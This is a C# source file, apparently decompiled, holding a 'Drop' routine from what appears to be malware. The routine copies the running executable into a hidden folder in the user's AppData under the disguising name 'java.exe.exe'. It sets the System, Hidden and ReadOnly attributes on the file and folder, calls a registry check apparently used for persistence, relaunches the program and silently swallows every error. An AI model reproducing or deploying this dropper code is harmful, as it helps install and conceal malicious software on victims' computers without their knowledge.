using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication1;

internal class Install
{
	[DebuggerNonUserCode]
	public Install()
	{
	}

	public static void Drop()
	{
		string path = "java.exe.exe";
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\java.exe";
		string text2 = Path.Combine(text, path);
		if (Operators.CompareString(Environment.CurrentDirectory, text, false) == 0)
		{
			return;
		}
		try
		{
			Reg.CheckReg();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			if (File.Exists(text2))
			{
				try
				{
					File.SetAttributes(text2, FileAttributes.Normal);
					File.Delete(text2);
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
					File.SetAttributes(text2, File.GetAttributes(text2) + 4 + 2 + 8192 + 1);
					ProcessStartInfo startInfo = new ProcessStartInfo();
					Process.Start(startInfo);
					Environment.Exit(0);
					return;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					return;
				}
			}
			try
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
					File.SetAttributes(text, File.GetAttributes(text) + 4 + 2 + 1 + 8192);
				}
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
				ProcessStartInfo startInfo2 = new ProcessStartInfo();
				Process.Start(startInfo2);
				Environment.Exit(0);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
